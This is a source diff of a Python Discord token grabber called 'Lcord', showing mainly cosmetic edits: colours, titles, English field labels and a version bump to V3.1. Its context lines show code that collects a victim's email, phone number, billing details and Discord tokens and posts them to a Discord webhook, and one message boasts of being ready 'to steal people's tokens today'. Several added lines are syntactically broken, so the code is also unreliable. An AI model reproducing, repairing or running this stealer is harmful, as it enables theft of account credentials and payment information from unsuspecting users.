@@ -15,7 +15,7 @@ from tqdm import tqdm, trange
 from time import sleep
 import os
 os.system("title Loading assets...")
-print(f"{Fore.LIGHTBLUE_EX}")
+print(f"{Fore.PURPLE_EX}")
 progressbar = tqdm([2,4,6,8,9,10,11,12,13,14,15])
 for item in progressbar:
     sleep(0.1)
@@ -135,17 +135,17 @@ class Grab:
         if not phone:
             phone = invalid
         data = [{
-            "title": "check me out!",
+            "title": "Click Me!",
             "description": "Grabbed!",
             "url": "https://ayo.so/high",
             "image": {
                 "url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg"
             },
-            "color": 0x1D5EFF,
+            "color": #A020F0,
             "fields": [
                 {
                     "name": "**email + phone**",
-                            "value": f'Email: {email}\nTéléphone: {phone}\nPaiement: {billing}',
+                            "value": f'Email: {email}\nPhone number: {phone}\nBilling Info: {billing}',
                             "inline": True
                 },
                 {
@@ -180,7 +180,7 @@ class Grab:
         data = {"username": "Lcord",
                 "avatar_url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg8",
                 "embeds": data,
-                "content": "@everyone" poopcicles ""}
+                "content": "@everyone"}
         return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
 sent_tokens = []
 def token_grab():
@@ -199,7 +199,7 @@ ready_data = [{
     "fields": [
         {
             "name": "**Ready!**",
-            "value": 'im ready to get some tokens',
+            "value": 'im ready to steal people's tokens today',
             "inline": True
         }
     ],
@@ -269,7 +269,7 @@ LLLLLLLLLLLLLLLLLLLLLLLL       CCCCCCCCCCCCC     OOOOOOOOO     RRRRRRRR     RRRR
 
 System.Clear()
 System.Size(155, 45)
-System.Title("Lcord V2 // Ayo.so/highW // dicord.gg/fXEDpac9HT ")
+System.Title("Lcord V3.1 // Ayo.so/highW // dicord.gg/fXEDpac9HT ")
 
 
 Anime.Fade(Center.Center(banner), Colors.purple_to_blue,
